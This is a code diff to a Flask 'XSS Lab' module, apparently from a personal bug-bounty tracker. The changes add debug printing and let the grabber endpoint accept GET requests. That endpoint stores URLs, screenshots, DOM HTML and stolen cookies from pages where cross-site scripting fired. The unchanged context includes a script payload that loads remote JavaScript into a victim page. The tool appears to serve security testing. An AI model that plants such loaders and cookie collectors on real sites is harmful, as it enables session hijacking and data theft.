@@ -1,16 +1,19 @@
 from flask import Blueprint, render_template, request
 from utils import *
 from json import dumps as jsonify
+import pprint
 
 lab = Blueprint('lab', __name__)
 
 """
 id|url|screenshot|ip|domhtml|cookie|useragent
 """
-@lab.route('/lab/grabber', methods=['POST'])
+@lab.route('/lab/grabber', methods=['GET', 'POST'])
 def grabber():
+	pprint.pprint(request.form)
 	if grab_valid(request.form):
 		try:
+			print "ok"
 			db = get_db()
 			db.execute("insert into xss (url, screenshot, ip, domhtml, cookie, useragent) values (?, ?, ?, ?, ?, ?)", \
 				[request.form['url'], request.form['screenshot'], request.remote_addr, request.form['domhtml'], request.form['cookie'], request.form['useragent']])
@@ -36,4 +39,4 @@ def index():
 	payloads.append('<script>var x=new XMLHttpRequest();x.open("GET","//127.0.0.1:5000/js");x.send(); x.onreadystatechange=function(){if(this.readyState==4){document.write(x.responseText)}}</script>')
 
 	bounties_info, information_count, xsslab_info, xsslab_count, targets_info, targets_count = extract_db()
-	return render_template('index.html', bounties=bounties_info, nbounties=information_count[0][0], ndollars=sum_reward(bounties_info), xsslab=xsslab_info, nxss=xsslab_count[0][0], targets=targets_info, ntargets=targets_count[0][0], page="lab.html",payloads=payloads )
+	return render_template('index.html', title='XSS Lab', bounties=bounties_info, nbounties=information_count[0][0], ndollars=sum_reward(bounties_info), xsslab=xsslab_info, nxss=xsslab_count[0][0], targets=targets_info, ntargets=targets_count[0][0], page="lab.html",payloads=payloads )
